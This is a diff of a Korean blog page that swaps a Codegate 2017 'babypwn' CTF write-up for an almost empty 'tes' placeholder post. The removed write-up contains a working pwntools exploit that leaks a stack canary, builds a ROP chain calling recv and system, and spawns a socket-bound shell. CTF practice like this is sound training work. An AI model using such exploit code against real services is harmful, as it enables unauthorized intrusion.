@@ -7,20 +7,19 @@
   
   
   
-  <title>codegate 2017 CTF - babypwn | 귀찮다</title>
+  <title>tes | 귀찮다</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="대충 취약점 발생하는 부분만 대충 살펴보고 system 주소 동적으로 구하려 exploit 작성중 systme@plt 보고서 잠시 현자타임.">
-<meta name="keywords" content="Ctf">
+  <meta name="description" content="목차stage 1목차 stage1">
 <meta property="og:type" content="article">
-<meta property="og:title" content="codegate 2017 CTF - babypwn">
-<meta property="og:url" content="https://blog.z2e4o6.com/2018/09/24/babypwn/index.html">
+<meta property="og:title" content="tes">
+<meta property="og:url" content="https://blog.z2e4o6.com/2018/09/25/tes/index.html">
 <meta property="og:site_name" content="귀찮다">
-<meta property="og:description" content="대충 취약점 발생하는 부분만 대충 살펴보고 system 주소 동적으로 구하려 exploit 작성중 systme@plt 보고서 잠시 현자타임.">
+<meta property="og:description" content="목차stage 1목차 stage1">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2018-09-23T16:01:49.287Z">
+<meta property="og:updated_time" content="2018-09-25T05:58:15.750Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="codegate 2017 CTF - babypwn">
-<meta name="twitter:description" content="대충 취약점 발생하는 부분만 대충 살펴보고 system 주소 동적으로 구하려 exploit 작성중 systme@plt 보고서 잠시 현자타임.">
+<meta name="twitter:title" content="tes">
+<meta name="twitter:description" content="목차stage 1목차 stage1">
   
   
     <link rel="icon" href="/img/one.png">
@@ -252,11 +251,11 @@
         </header>
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-babypwn" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-tes" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a  href="/2018/09/24/babypwn/" class="article-date">
-      <time datetime="2018-09-23T15:54:17.000Z" itemprop="datePublished">2018-09-24</time>
+      <a  href="/2018/09/25/tes/" class="article-date">
+      <time datetime="2018-09-25T05:48:12.000Z" itemprop="datePublished">2018-09-25</time>
 </a>
 
     </div>
@@ -270,7 +269,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      codegate 2017 CTF - babypwn
+      tes
     </h1>
   
 
@@ -279,16 +278,8 @@
       
       <div class="article-info article-info-post">
         
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/ctf/">ctf</a>
-    </div>
-
 
         
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Ctf/">Ctf</a></li></ul>
-    </div>
-
         <div class="clearfix"></div>
       </div>
       
@@ -296,12 +287,8 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>대충 취약점 발생하는 부분만 대충 살펴보고 system 주소 동적으로 구하려 exploit 작성중 systme@plt 보고서 잠시 현자타임.</p>
-<a id="more"></a>
-<p>buffer의 크기인 40byte보다 더큰 0x64 bytes를 받아들여서 buffer over flow 발생</p>
-<p>나머지는 그냥 rop로 풀면 됨.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line"># OFFSET = 52</span><br><span class="line"> </span><br><span class="line">e = ELF(&quot;./babypwn&quot;)</span><br><span class="line"> </span><br><span class="line">def get_canary():</span><br><span class="line">    s = remote(&quot;127.0.0.1&quot;,8181)</span><br><span class="line">    s.recvuntil(&apos;menu &gt; &apos;)</span><br><span class="line">    s.send(&apos;1\n&apos;)</span><br><span class="line">    s.recvuntil(&apos;: &apos;)</span><br><span class="line">    s.send(&quot;A&quot;*41)</span><br><span class="line">    data = s.recv(54)</span><br><span class="line">    s.close()</span><br><span class="line">    return u32(&apos;\x00&apos; + data[41:44])</span><br><span class="line"> </span><br><span class="line">canary = p32(get_canary())</span><br><span class="line">print &quot;[*] canary : &quot; + str(hex(u32(canary)))</span><br><span class="line">s = remote(&quot;127.0.0.1&quot;,8181)</span><br><span class="line">ppppr = 0x8048eec</span><br><span class="line">pr = 0x8048eef</span><br><span class="line">cmd = &apos;/bin/sh &gt;&amp;4 &lt;&amp;4&apos;</span><br><span class="line">s = process(&quot;./babypwn&quot;)</span><br><span class="line">print s.recvuntil(&apos;menu &gt; &apos;)</span><br><span class="line">s.send(&apos;1\n&apos;)</span><br><span class="line">s.recvuntil(&apos;: &apos;)</span><br><span class="line"> </span><br><span class="line">payload = &quot;&quot;</span><br><span class="line">payload += &quot;\x90&quot;*40 + canary + &quot;\x90&quot;*12</span><br><span class="line">payload += p32(e.plt[&apos;recv&apos;]) + p32(ppppr) + p32(4) + p32(e.bss()) + p32(len(cmd)) + p32(0x0)</span><br><span class="line">payload += p32(e.plt[&apos;system&apos;]) + &quot;DUDU&quot; + p32(e.bss())+&quot;\x00\x00\x00\x00&quot;</span><br><span class="line">s.sendline(payload)</span><br><span class="line">print s.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">s.send(&apos;3\n&apos;);sleep(0.3)</span><br><span class="line">s.send(cmd);sleep(0.3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure>
-<p>ctf 기분좀 내보려고 flag 파일 내가 만들어서 했다</p>
+        <h1 id="목차"><a href="#목차" class="headerlink" title="목차"></a>목차</h1><h2 id="stage-1"><a href="#stage-1" class="headerlink" title="stage 1"></a>stage 1</h2><p><a href="#index">목차</a></p>
+<p><a href="#stage1">stage1</a></p>
 
       
     </div>
@@ -310,28 +297,19 @@
   
     
     <div class="copyright">
-        <p><span>제목:</span><a  href="/2018/09/24/babypwn/">codegate 2017 CTF - babypwn</a></p>
+        <p><span>제목:</span><a  href="/2018/09/25/tes/">tes</a></p>
         <p><span>저자:</span><a  href="/" title="访问 K4el 的个人博客">K4el</a></p>
-        <p><span>발행 시간:</span>2018년09월24일 - 00시54분</p>
-        <p><span>마지막 업데이트:</span>2018년09월24일 - 01시01분</p>
+        <p><span>발행 시간:</span>2018년09월25일 - 14시48분</p>
+        <p><span>마지막 업데이트:</span>2018년09월25일 - 14시58분</p>
     </div>
 
 
 
 <nav id="article-nav">
   
-    <a  href="/2018/09/24/ropp/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          Plaid CTF - ropasaurusrex
-        
-      </div>
-    </a>
   
-  
-    <a  href="/2018/09/24/exploit-exercise-fusion-01/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">exploit-exercise-fusion-01</div>
+    <a  href="/2018/09/25/0x00-ctf/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">0x00_ctf_left</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -343,7 +321,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">Article directory</strong>
-    
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#목차"><span class="toc-number">1.</span> <span class="toc-text">목차</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#stage-1"><span class="toc-number">1.1.</span> <span class="toc-text">stage 1</span></a></li></ol></li></ol>
 </div>
 <style>
     .left-col .switch-btn {
@@ -416,13 +394,11 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a  href="/2018/09/24/ropp/" title="上一篇: Plaid CTF - ropasaurusrex">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a  href="/" title="HOME"><i class="fa fa-home"></i></a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a  href="/2018/09/24/exploit-exercise-fusion-01/" title="下一篇: exploit-exercise-fusion-01">
+            <a  href="/2018/09/25/0x00-ctf/" title="下一篇: 0x00_ctf_left">
                 <i class="fa fa-angle-right"></i>
             </a>
         
